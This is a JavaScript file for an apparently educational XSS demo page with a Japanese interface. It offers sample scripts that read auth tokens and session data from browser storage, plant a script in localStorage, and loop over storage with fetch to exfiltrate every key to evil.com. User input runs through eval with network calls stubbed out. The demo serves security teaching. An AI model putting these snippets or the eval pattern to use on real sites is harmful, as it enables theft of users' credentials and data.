class XSSDemo {
  constructor() {
    this.xssInput = document.getElementById("xssInput");
    this.xssResult = document.getElementById("xssResult");
    this.attackCategories = {
      basic: {
        name: "🎯 基本的な攻撃",
        description: "単純なlocalStorageアクセス攻撃",
        scripts: [
          {
            code: 'localStorage.getItem("token")',
            name: "トークン窃取",
            explanation: "認証トークンを直接取得"
          },
          {
            code: 'sessionStorage.getItem("user_data")',
            name: "セッションデータ窃取", 
            explanation: "セッションストレージからユーザー情報を取得"
          }
        ]
      },
      advanced: {
        name: "🔥 高度な攻撃",
        description: "全データ窃取や持続的攻撃",
        scripts: [
          {
            code: 'Object.keys(localStorage).map(k => `${k}: ${localStorage.getItem(k)}`).join("\\n")',
            name: "全データ列挙",
            explanation: "localStorage内の全データを一覧表示"
          },
          {
            code: 'JSON.stringify(localStorage)',
            name: "JSON形式で全取得",
            explanation: "全データをJSON形式で構造化して取得"
          }
        ]
      },
      persistent: {
        name: "💀 持続的攻撃",
        description: "マルウェア埋め込みや継続的な攻撃",
        scripts: [
          {
            code: 'localStorage.setItem("malware", "<script>alert(\\"Persistent XSS!\\")</script>")',
            name: "マルウェア埋め込み",
            explanation: "悪意のあるコードをlocalStorageに保存"
          },
          {
            code: 'for(let i=0; i<localStorage.length; i++) { const key = localStorage.key(i); fetch(`https://evil.com/steal?${key}=${localStorage.getItem(key)}`); }',
            name: "外部送信攻撃",
            explanation: "全データを攻撃者のサーバーへ送信"
          }
        ]
      }
    };
  }

  init() {
    window.runXSS = () => this.runXSS();
    this.addExampleButtons();
    this.addWarning();
  }

  addWarning() {
    const warningElement = document.createElement("div");
    warningElement.className = "xss-warning";
    warningElement.innerHTML = `
      <strong>⚠️ 警告:</strong> このデモは教育目的のみです。
      実際のWebサイトで同様のコードを実行しないでください。
    `;
    
    const xssSection = document.getElementById("xss");
    const firstChild = xssSection.querySelector("p");
    if (firstChild) {
      firstChild.after(warningElement);
    }
  }

  addExampleButtons() {
    const exampleContainer = document.createElement("div");
    exampleContainer.className = "xss-examples";
    exampleContainer.innerHTML = "<h3>🎯 攻撃シナリオ選択</h3>";
    
    Object.entries(this.attackCategories).forEach(([categoryId, category]) => {
      const categorySection = document.createElement("div");
      categorySection.className = "attack-category";
      
      const categoryHeader = document.createElement("div");
      categoryHeader.className = "category-header";
      categoryHeader.innerHTML = `
        <h4>${category.name}</h4>
        <p class="category-description">${category.description}</p>
      `;
      categorySection.appendChild(categoryHeader);
      
      const scriptsContainer = document.createElement("div");
      scriptsContainer.className = "attack-scripts";
      
      category.scripts.forEach((script, index) => {
        const scriptCard = document.createElement("div");
        scriptCard.className = "attack-script-card";
        scriptCard.innerHTML = `
          <div class="script-info">
            <strong>${script.name}</strong>
            <span class="script-explanation">${script.explanation}</span>
          </div>
          <button class="select-script-btn" data-code="${script.code.replace(/"/g, '&quot;')}">
            選択
          </button>
        `;
        
        scriptCard.querySelector('.select-script-btn').onclick = () => {
          this.xssInput.value = script.code;
          this.showScriptExplanation(script);
        };
        
        scriptsContainer.appendChild(scriptCard);
      });
      
      categorySection.appendChild(scriptsContainer);
      exampleContainer.appendChild(categorySection);
    });
    
    this.xssInput.parentNode.insertBefore(exampleContainer, this.xssInput);
  }

  showScriptExplanation(script) {
    let explanationDiv = document.querySelector('.script-explanation-active');
    if (explanationDiv) {
      explanationDiv.remove();
    }
    
    explanationDiv = document.createElement('div');
    explanationDiv.className = 'script-explanation-active';
    explanationDiv.innerHTML = `
      <div class="explanation-content">
        <h4>📝 選択された攻撃: ${script.name}</h4>
        <p><strong>動作:</strong> ${script.explanation}</p>
        <p><strong>コード:</strong></p>
        <code>${script.code}</code>
        <div class="risk-indicator">
          <span class="risk-level">🔴 高リスク</span>
          <span>実際の攻撃では個人情報やアカウントが盗まれる可能性があります</span>
        </div>
      </div>
    `;
    
    this.xssInput.parentNode.insertBefore(explanationDiv, this.xssInput.nextSibling);
  }

  runXSS() {
    const input = this.xssInput.value.trim();
    
    if (!input) {
      this.showResult("スクリプトを入力してください", "info");
      return;
    }

    this.clearResult();
    this.ensureDemoData(input);
    this.showExecutionSteps(input);
    
    let restoreSandbox = () => {};

    try {
      console.log("XSSデモ実行:", input);

      const originalAlert = window.alert;
      const originalFetch = window.fetch;
      const originalXMLHttpRequest = window.XMLHttpRequest;
      const originalWebSocket = window.WebSocket;
      const originalImage = window.Image;
      const originalSendBeacon = navigator.sendBeacon;
      let alertContent = null;
      let fetchAttempts = [];
      let blockedRequests = [];

      // thisのコンテキストを保存
      const self = this;

      // 差し替えるより先に復元手順を決めておく。
      // 途中で例外が出ても、必ずこの関数で元へ戻せるようにする。
      restoreSandbox = () => {
        window.alert = originalAlert;
        window.fetch = originalFetch;
        window.XMLHttpRequest = originalXMLHttpRequest;
        window.WebSocket = originalWebSocket;
        window.Image = originalImage;
        navigator.sendBeacon = originalSendBeacon;
      };


      window.alert = (msg) => {
        alertContent = msg;
        self.logSecurityEvent("ALERT_CALLED", { message: msg });
      };

      window.fetch = (url, options) => {
        fetchAttempts.push({ url, options });
        self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { url, options });
        return Promise.reject(new Error("セキュリティ: 外部送信をブロックしました"));
      };

      // XMLHttpRequestをブロック
      window.XMLHttpRequest = class {
        open() {
          blockedRequests.push({ type: 'XMLHttpRequest', args: arguments });
        }
        send() {
          self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'XMLHttpRequest' });
        }
        setRequestHeader() {}
      };

      // WebSocketをブロック
      window.WebSocket = class {
        constructor(url) {
          blockedRequests.push({ type: 'WebSocket', url });
          self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'WebSocket', url });
          throw new Error("セキュリティ: WebSocket接続をブロックしました");
        }
      };

      // Imageの外部URLをブロック
      window.Image = class extends originalImage {
        set src(value) {
          if (value && (value.startsWith('http://') || value.startsWith('https://') || value.startsWith('//'))) {
            blockedRequests.push({ type: 'Image', src: value });
            self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'Image', src: value });
            // 外部URLはブロック（何もしない）
          } else {
            // 相対URLやdata:URIは許可
            super.src = value;
          }
        }
        get src() { return super.src; }
      };

      // navigator.sendBeaconをブロック
      navigator.sendBeacon = (url, data) => {
        blockedRequests.push({ type: 'sendBeacon', url, data });
        self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'sendBeacon', url });
        return false;
      };

      const beforeStorage = this.captureStorageSnapshot();
      const result = eval(input);
      const afterStorage = this.captureStorageSnapshot();

      // すべてのオーバーライドを元に戻す
      restoreSandbox();

      // 全ての試行をカウント
      const totalBlockedRequests = fetchAttempts.length + blockedRequests.length;
      this.analyzeSecurityImpact(beforeStorage, afterStorage, totalBlockedRequests);
      
      if (alertContent !== null) {
        this.showResult(`alert内容: ${alertContent}`, "alert");
      } else {
        // 外部送信攻撃の場合（fetch使用を優先判定）
        if (input.includes('fetch(') && (input.includes('localStorage') || input.includes('sessionStorage'))) {
          this.showResult("⚠️ 外部送信攻撃を実行しました（セキュリティ機能により通信はブロック済み）", "alert");
        }
        // setItem系の攻撃の場合
        else if (input.includes('localStorage.setItem') || input.includes('sessionStorage.setItem')) {
          this.showResult("✅ 攻撃スクリプトの実行が完了しました（データがストレージに書き込まれました）", "success");
        }
        // 通常の結果表示
        else if (result !== undefined) {
          this.showResult(`実行結果: ${this.formatResult(result)}`, "success");
        } else {
          this.showResult("実行完了（結果なし）", "info");
        }
      }
      
    } catch (e) {
      restoreSandbox();
      this.showResult(`エラー: ${e.message}`, "error");
    }
  }

  showExecutionSteps(script) {
    const stepsDiv = document.createElement('div');
    stepsDiv.className = 'execution-steps';
    stepsDiv.innerHTML = `
      <h4>🔍 実行ステップ</h4>
      <ol class="steps-list">
        <li class="step-item">✅ 入力スクリプトの検証完了</li>
        <li class="step-item">🔐 セキュリティ環境の準備完了</li>
        <li class="step-item">📊 ストレージ状態の記録開始</li>
        <li class="step-item active">⚡ スクリプト実行中...</li>
      </ol>
    `;
    
    this.xssResult.parentNode.insertBefore(stepsDiv, this.xssResult);
    
    setTimeout(() => {
      const lastStep = stepsDiv.querySelector('.step-item.active');
      if (lastStep) {
        lastStep.textContent = '✅ スクリプト実行完了';
        lastStep.classList.remove('active');
      }
    }, 500);
  }

  captureStorageSnapshot() {
    const snapshot = {
      localStorage: {},
      sessionStorage: {},
      count: {
        local: localStorage.length,
        session: sessionStorage.length
      }
    };
    
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      snapshot.localStorage[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      snapshot.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    return snapshot;
  }

  analyzeSecurityImpact(before, after, totalBlockedRequests) {
    const changes = {
      localStorage: this.compareStorageObjects(before.localStorage, after.localStorage),
      sessionStorage: this.compareStorageObjects(before.sessionStorage, after.sessionStorage),
      externalRequests: totalBlockedRequests
    };

    this.displaySecurityAnalysis(changes);
  }

  compareStorageObjects(before, after) {
    const changes = { added: [], modified: [], removed: [] };
    
    Object.keys(after).forEach(key => {
      if (!before[key]) {
        changes.added.push(key);
      } else if (before[key] !== after[key]) {
        changes.modified.push(key);
      }
    });
    
    Object.keys(before).forEach(key => {
      if (!after[key]) {
        changes.removed.push(key);
      }
    });
    
    return changes;
  }

  displaySecurityAnalysis(changes) {
    const hasChanges = changes.localStorage.added.length || 
                      changes.localStorage.modified.length || 
                      changes.localStorage.removed.length ||
                      changes.sessionStorage.added.length || 
                      changes.sessionStorage.modified.length || 
                      changes.sessionStorage.removed.length ||
                      changes.externalRequests > 0;
    
    if (hasChanges) {
      const analysisDiv = document.createElement('div');
      analysisDiv.className = 'security-analysis';
      analysisDiv.innerHTML = `
        <h4>🛡️ セキュリティ影響分析</h4>
        ${this.generateAnalysisReport(changes)}
      `;
      
      this.xssResult.parentNode.insertBefore(analysisDiv, this.xssResult);
    }
  }

  generateAnalysisReport(changes) {
    let report = '<div class="analysis-report">';
    
    if (changes.localStorage.added.length || changes.localStorage.modified.length || changes.localStorage.removed.length) {
      report += `
        <div class="storage-changes">
          <h5>📦 localStorage への影響:</h5>
          <ul>
            ${changes.localStorage.added.map(key => `<li class="change-added">➕ 追加: "${key}"`).join('')}
            ${changes.localStorage.modified.map(key => `<li class="change-modified">✏️ 変更: "${key}"`).join('')}
            ${changes.localStorage.removed.map(key => `<li class="change-removed">❌ 削除: "${key}"`).join('')}
          </ul>
        </div>
      `;
    }
    
    if (changes.sessionStorage.added.length || changes.sessionStorage.modified.length || changes.sessionStorage.removed.length) {
      report += `
        <div class="storage-changes">
          <h5>⏳ sessionStorage への影響:</h5>
          <ul>
            ${changes.sessionStorage.added.map(key => `<li class="change-added">➕ 追加: "${key}"`).join('')}
            ${changes.sessionStorage.modified.map(key => `<li class="change-modified">✏️ 変更: "${key}"`).join('')}
            ${changes.sessionStorage.removed.map(key => `<li class="change-removed">❌ 削除: "${key}"`).join('')}
          </ul>
        </div>
      `;
    }
    
    if (changes.externalRequests > 0) {
      report += `
        <div class="security-threat">
          <h5>🚨 外部通信の試行:</h5>
          <p class="threat-blocked">${changes.externalRequests}件の外部送信試行をブロックしました</p>
          <p class="threat-warning">⚠️ 実際の攻撃では、この通信により個人情報が盗まれます</p>
        </div>
      `;
    }
    
    report += '</div>';
    return report;
  }

  logSecurityEvent(type, data) {
    console.warn(`セキュリティイベント [${type}]:`, data);
  }

  ensureDemoData(script) {
    // 基本的な攻撃デモ用のサンプルデータを自動で準備
    if (script.includes('localStorage.getItem("token")') && !localStorage.getItem("token")) {
      localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo_user_token");
      this.showDataPreparationNotice("token");
    }
    
    if (script.includes('sessionStorage.getItem("user_data")') && !sessionStorage.getItem("user_data")) {
      sessionStorage.setItem("user_data", JSON.stringify({
        userId: 12345,
        username: "demo_user",
        email: "demo@example.com",
        role: "user"
      }));
      this.showDataPreparationNotice("user_data");
    }
    
    // 全データ取得系の攻撃の場合、複数のサンプルデータを準備
    if ((script.includes('Object.keys(localStorage)') || script.includes('JSON.stringify(localStorage)')) 
        && localStorage.length === 0) {
      localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo_jwt_token");
      localStorage.setItem("user_id", "12345");
      localStorage.setItem("preferences", JSON.stringify({theme: "dark", lang: "ja"}));
      this.showDataPreparationNotice("multiple items");
    }
  }

  showDataPreparationNotice(dataType) {
    const notice = document.createElement('div');
    notice.className = 'data-preparation-notice';
    notice.innerHTML = `
      <div class="notice-content">
        <span class="notice-icon">📋</span>
        <span class="notice-text">デモ用に "${dataType}" をlocalStorageに自動追加しました</span>
      </div>
    `;
    
    this.xssResult.parentNode.insertBefore(notice, this.xssResult);
    
    // 3秒後に自動で削除
    setTimeout(() => {
      notice.remove();
    }, 3000);
  }

  formatResult(result) {
    if (result === null) return "null";
    if (result === undefined) return "undefined";
    if (typeof result === "object") {
      try {
        return JSON.stringify(result, null, 2);
      } catch {
        return String(result);
      }
    }
    return String(result);
  }

  showResult(message, type) {
    this.xssResult.className = `xss-output xss-${type}`;
    this.xssResult.textContent = message;
    this.xssResult.style.display = "block";
  }

  clearResult() {
    this.xssResult.style.display = "none";
    this.xssResult.textContent = "";
    
    const stepsDiv = document.querySelector('.execution-steps');
    if (stepsDiv) stepsDiv.remove();
    
    const analysisDiv = document.querySelector('.security-analysis');
    if (analysisDiv) analysisDiv.remove();
    
    const explanationDiv = document.querySelector('.script-explanation-active');
    if (explanationDiv) explanationDiv.remove();
    
  }

}

window.XSSDemo = XSSDemo;
